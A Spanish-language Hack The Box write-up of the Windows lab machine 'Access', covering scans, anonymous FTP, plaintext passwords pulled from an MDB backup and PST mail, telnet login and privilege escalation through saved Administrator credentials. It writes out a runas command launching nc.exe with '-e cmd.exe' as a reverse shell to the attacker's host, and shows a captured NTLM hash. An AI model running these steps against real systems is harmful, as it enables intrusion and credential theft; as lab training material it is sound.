---
title: "HTB write-up: Access"
date: 2019-03-01T16:50:10-06:00
tags: ["hackthebox","htb","passthehash","rce","windows"]
categories: ["htb","pentesting"]
---

Si tuviera que resumir access en unas pocas frases seria: 

- Enumera a la organización
- Busca en todas las esquinas
- Los de ingeniería siempre tienen más permisos

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![access image](https://www.hackthebox.eu/storage/avatars/adef7ad3d015a1fbc5235d5a201ca7d1_thumb.png) [access](https://www.hackthebox.eu/home/machines/profile/156) | [egre55](https://www.hackthebox.eu/home/users/profile/1190) | Windows | 10.10.10.98 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-access/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

``` text
root@laptop:~# nmap -sS -p- 10.10.10.98 --open -v -n
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:54 CST
Initiating Ping Scan at 11:54
Scanning 10.10.10.98 [4 ports]
Completed Ping Scan at 11:54, 0.43s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:54
Scanning 10.10.10.98 [65535 ports]
Discovered open port 21/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 23/tcp on 10.10.10.98
Completed SYN Stealth Scan at 12:17, 1375.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.98
Host is up (0.20s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1376.09 seconds
           Raw packets sent: 131972 (5.807MB) | Rcvd: 993 (58.980KB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Corroboremos con `masscan`:

``` text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.98

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 18:50:23 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-A):

``` text
root@laptop:~# nmap -A -T4 -p80,23,21 10.10.10.98 --open -v -n
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:12 CST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating Ping Scan at 11:12
Scanning 10.10.10.98 [4 ports]
Completed Ping Scan at 11:12, 0.43s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:12
Scanning 10.10.10.98 [3 ports]
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Discovered open port 23/tcp on 10.10.10.98
Completed SYN Stealth Scan at 11:12, 0.42s elapsed (3 total ports)
Initiating Service scan at 11:12
Scanning 3 services on 10.10.10.98
Completed Service scan at 11:15, 161.96s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.98
adjust_timeouts2: packet supposedly had rtt of -62414 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -62414 microseconds.  Ignoring time.
Retrying OS detection (try #2) against 10.10.10.98
Initiating Traceroute at 11:15
Completed Traceroute at 11:15, 0.20s elapsed
NSE: Script scanning 10.10.10.98.
Initiating NSE at 11:15
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Completed NSE at 11:16, 31.40s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 1.34s elapsed
Nmap scan report for 10.10.10.98
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:m
icrosoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows S
erver 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows S
erver 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows
 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.025 days (since Thu Jan  3 10:40:39 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   185.77 ms 10.10.12.1
2   188.09 ms 10.10.10.98

NSE: Script Post-scanning.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.12 seconds
           Raw packets sent: 100 (8.298KB) | Rcvd: 48 (3.024KB)
```

- `-A`: El parámetro por defecto mas utilizado en `nmap`, es una abreviación de `-sV -sC -O`
- `-T4`: Equivalente al modo agresivo de tiempos aka `--max-rtt-timeout 1250 --initial-rtt-timeout 500 --max-retries 6`
- `-p80,23,21`: Los puertos a analizar
- `--open`: Solo puertos abiertos, redundante porque ya enumeramos los puertos sorry
- `-v`: Muestrame más
- `-n`: No resuelvas nada nmap!

Tenemos un ftp que permite el ingreso a cualquiera, un telnet medio dummy aka Windows Telnet, un IIS 7.5 de MegaCorp. Comencemos por el servidor HTTP.

# Gobuster

Tenia que mencionarlo, le tire un gobuster y no encontré nada relevante para mí D:

Continué con el siguiente servicio.

# Get a FTP Mirror

Para el servicio FTP que tiene acceso anónimo, decidí usar wget mirror, el cual luce de la siguiente manera:

``` text
xbytemx@laptop:~/htb/access/ftp-anon$ wget --no-passive-ftp -m ftp://anonymous:@10.10.10.98/
--2019-01-03 11:53:53--  ftp://anonymous:*password*@10.10.10.98/
           => “10.10.10.98/.listing”
Conectando con 10.10.10.98:21... conectado.
Identificándose como anonymous ... ¡Dentro!
==> SYST ... hecho.   ==> PWD ... hecho.
==> TYPE I ... hecho.  ==> no se necesita CWD.
==> PORT ... hecho.   ==> LIST ... hecho.

10.10.10.98/.listing                  [ <=>                                                         ]      97  --.-KB/s    en 0s

==> PORT ... hecho.   ==> LIST ... hecho.

10.10.10.98/.listing                  [ <=>                                                         ]      97  --.-KB/s    en 0s

2019-01-03 11:53:56 (10.6 MB/s) - “10.10.10.98/.listing” guardado [194]

--2019-01-03 11:53:56--  ftp://anonymous:*password*@10.10.10.98/Backups/
           => “10.10.10.98/Backups/.listing”
==> CWD (1) /Backups ... hecho.
==> PORT ... hecho.   ==> LIST ... hecho.

10.10.10.98/Backups/.listing          [ <=>                                                         ]      51  --.-KB/s    en 0s

2019-01-03 11:53:57 (2.80 MB/s) - “10.10.10.98/Backups/.listing” guardado [51]

--2019-01-03 11:53:57--  ftp://anonymous:*password*@10.10.10.98/Backups/backup.mdb
           => “10.10.10.98/Backups/backup.mdb”
==> no se requiere CWD.
==> PORT ... hecho.   ==> RETR backup.mdb ... hecho.
Longitud: 5652480 (5.4M)

10.10.10.98/Backups/backup.mdb    100%[============================================================>]   5.39M   273KB/s    en 22s

2019-01-03 11:54:20 (248 KB/s) - “10.10.10.98/Backups/backup.mdb” guardado [5652480]

--2019-01-03 11:54:20--  ftp://anonymous:*password*@10.10.10.98/Engineer/
           => “10.10.10.98/Engineer/.listing”
==> CWD (1) /Engineer ... hecho.
==> PORT ... hecho.   ==> LIST ... hecho.

10.10.10.98/Engineer/.listing         [ <=>                                                         ]      59  --.-KB/s    en 0s

2019-01-03 11:54:20 (3.00 MB/s) - “10.10.10.98/Engineer/.listing” guardado [59]

--2019-01-03 11:54:20--  ftp://anonymous:*password*@10.10.10.98/Engineer/Access%20Control.zip
           => “10.10.10.98/Engineer/Access Control.zip”
==> no se requiere CWD.
==> PORT ... hecho.   ==> RETR Access Control.zip ... hecho.
Longitud: 10870 (11K)

10.10.10.98/Engineer/Access Contr 100%[============================================================>]  10.62K  28.8KB/s    en 0.4s

2019-01-03 11:54:22 (28.8 KB/s) - “10.10.10.98/Engineer/Access Control.zip” guardado [10870]

ACABADO --2019-01-03 11:54:22--
Tiempo total de reloj: 28s
Descargados: 5 ficheros, 5.4M en 23s (245 KB/s)
```

Parámetros;

- `-m`: Modo mirror. Copia todo recursivamente, como lo encuentres
- `--no-passive-ftp`: Elegimos no usar el modo pasivo (cuando el server se conecta al cliente post login)
- `ftp://anonymous:@10.10.10.98`: Básicamente esta sentencia dice, conéctate por FTP, usa el usuario anonymous sin pass a la ip 10.10.10.98

Nos traemos un archivo zip, `Access Control.zip` y un archivo con extensión **mdb**, `backup.mdb`.

Analicemos el backup.

# MDB reading

He de confesar que no conocía este tipo de archivo y que después de googlear un poco acerca de su contenido\-formato, encontré la herramienta para explorarlo. Empecé por listar las tablas:

``` text
xbytemx@laptop:~/htb/access$ mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

Ahora que soy capaz de listar las tablas, se me ocurrió buscar dentro de cada tabla la palabra **password**, para ello realice el siguiente for en bash:

``` text
xbytemx@laptop:~/htb/access$ for TABLE in $(mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb); do mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb ${TABLE} | grep password && printf "La tabla es %s\n" ${TABLE}; done
id,username,password,Status,last_login,RoleID,Remark
La tabla es auth_user
```

Hemos encontrado una tabla curiosa, `auth_user`, exportamos al *STDOUT* el contenido de la tabla.

``` text
xbytemx@laptop:~/htb/access$ mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Si recordamos hace unos momentos del mirror, teníamos una carpeta llamada Engineer, en donde había un archivo zip. Puede que esta sea su password.

> Password for engineer is access4u@security

# Unzip Access Control file

Efectivamente, era la contraseña del ZIP. Siempre es bueno intentar todo lo nuevo que aprendamos de la enumeración.

``` text
xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-N
I)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

Desafortunadamente para la solución, no le estoy pasando como argumento la contraseña, pero les puedo asegurar que esa es la pass.

# Read PST file

Después de descomprimir el zip, tenemos un archivo con extensión **PST**, que es comúnmente usado por Outlook/Exchange, para almacenar los correos como un archivo, similar a EML. Exploramos este archivo con `readpst`:

``` text
xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

Tenemos un archivo tipo **MBOX** como salida, el cual simplemente pasamos por `strings`:

``` text
xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ strings Access\ Control.mbox00000001
From "john@megacorp.com" Thu Aug 23 18:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1807661852_-_-"
----boundary-LibPST-iamunique-1807661852_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1807661852_-_-"
--alt---boundary-LibPST-iamunique-1807661852_-_-
Content-Type: text/plain; charset="utf-8"
Hi there,
The password for the
security
 account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
Regards,
John
```

Corte el contenido posterior para no dejar muy extensa esta parte.

Descubrimos que la password de la cuenta *security* es **4Cc3ssC0ntr0ller**.

> Creds for telnet is security / 4Cc3ssC0ntr0ller

# *cat user.txt*

Usando estas credenciales, ingresemos por telnet:

``` text
xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>cd Desktop

C:\Users\security\Desktop>type user.txt
```

Listo, hemos obtenido la flag de user.

# PrivEsc

Después de verificar algunos datos sobre la cuenta, enumerar y enumerar un rato, encontré algo curioso con cmdkey:

``` text
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator

    Target: Domain:interactive=administrator@10.10.10.98
                                                            Type: Domain Password
    User: administrator@10.10.10.98

    Target: Domain:interactive=access\engineer
                                                  Type: Domain Password
    User: access\engineer


C:\Users\security\Desktop>
```

Tenemos almacenadas las credenciales de Administrator para el usuario engineer! Gracias `/list`!

Esto significa que es posible usar las credenciales almacenadas para ejecutar instrucciones en nombre de Administrator.

Por cierto si quieren saber mas sobre cmdkey, les dejo este [link](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey).

# Give me a reverse shell

En mi caso, me complique un poco de más y realice lo siguiente:

Usar las credenciales de Administrator para ejecutar un cmd.exe que remotamente ejecute un netcat que a su vez llame a un cmd. Esto significa que del lado de mi máquina levanta un smbserver y un listener de netcat.

``` text
C:\Users\security>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\10.10.13.32\a\nc.exe -vn 10.10.13.32 3001 -e cmd.exe"
```

Ejecutando runas (la implementación en windows de sudo y doas):
- `/savecred`: Usa las credenciales que ya tienes
- `/user:ACCESS\Administrator`: El usuario que debe ejecutarlo
- command: 
    - `/c`: Lanza el comando como oneshot
    - `\\10.10.13.32\a\nc.exe`: La ubicación remota y completa del ejecutable que se lanzará dentro de `cmd.exe`, en este caso `nc.exe`
        - `-vn`: Muestrame mas información y no me resuelvas nada
        - `10.10.13.32 3001`: Te vas a conectar por netcat a esta direccion y puerto
        - `-e cmd.exe`: Vas a ejecutar y concatenar este binario despues de conectarte

En el lado de mi máquina el smbserver a la escucha con parámetro `a` como el smbshare y la carpeta donde tengo netcat for win32.

``` text
root@laptop:/home/xbytemx/git/impacket/examples# python smbserver.py a /home/xbytemx/tools/netcat-win32-1.11/
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49157)
[*] AUTHENTICATE_MESSAGE (ACCESS\Administrator,ACCESS)
[*] User Administrator\ACCESS authenticated successfully
[*] Administrator::ACCESS:4141414141414141:705304e1f134ba65060d2b39864d93c9:010100000000000000ba7acb86acd401eddc87b6510dd4f900000000010010006b004e00760050004b0062004f0053000200100079005200460049006600520055006b00030010006b004e00760050004b0062004f0053000400100079005200460049006600520055006b000700080000ba7acb86acd40106000400020000000800300030000000000000000000000000300000ce9db888d778a45092ce747ee5d6e3db0ded2df675ab47b104b65825609ca8f00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310033002e0033003200000000000000000000000000
[*] AUTHENTICATE_MESSAGE (\,ACCESS)
[*] User \ACCESS authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:IPC$)
[-] Unknown level for query path info! 0x109
[-] Unknown level for query path info! 0x4
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(2:A)
```

Así es, ya tenia la hash de NTLM de Administrator, unos minutos rompiendo y conseguiría la pass, pero fui terco en concatenar comandos.

El netcat en mi máquina esperando el remote shell de cmd.exe:

``` text
xbytemx@laptop:~/htb/access$ ncat -vnlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.98.
Ncat: Connection from 10.10.10.98:49158.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator

C:\Windows\system32>cd c:\Users\Administrator\Desktop\
cd c:\Users\Administrator\Desktop\
```

# *cat root.txt*

Simplemente obtenemos la flag:

``` text
C:\Users\Administrator\Desktop>type root.txt
type root.txt
```

... and we got root flag and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
